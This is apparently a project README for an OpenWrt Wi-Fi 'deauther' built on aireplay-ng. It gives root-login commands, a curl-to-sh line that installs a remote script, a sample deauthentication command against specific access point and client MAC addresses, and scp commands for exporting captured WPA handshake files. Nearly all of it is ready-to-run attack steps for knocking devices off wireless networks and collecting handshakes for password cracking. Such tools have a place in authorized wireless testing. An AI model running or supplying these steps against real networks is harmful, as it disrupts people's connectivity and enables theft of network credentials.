# openwrt deauther based on airplay-ng
- Functions similar on kali
- Also it can capture WPA Handshakes

## Root access 
```sh
ssh root@192.168.1.1
```
```sh
telnet 192.168.1.1
```

## Auto install 
```sh

opkg update && opkg install curl && curl https://raw.githubusercontent.com/xiv3r/openwrt-deauther/refs/heads/main/install.sh | sh
````
## sample commands
> More info
 - aireplay-ng --help
 - airodump-ng --help
 - aircrack-ng --help

`
aireplay-ng mon0 --deauth 20 -a 32:AA:E4:18:90:45 -c CC:73:14:5D:59:FF --ignore-negative-one
`

## Export handshake or files from openwrt to local storage
- Termux Terminal 
```sh
scp root@192.168.1.1:*.cap storage/downloads
```
- Kali terminal 
```sh
scp root@192.168.1.1:*.cap /home/*/Downloads
```

> [Hint!]
 - *.cap - export any name with .cap file format
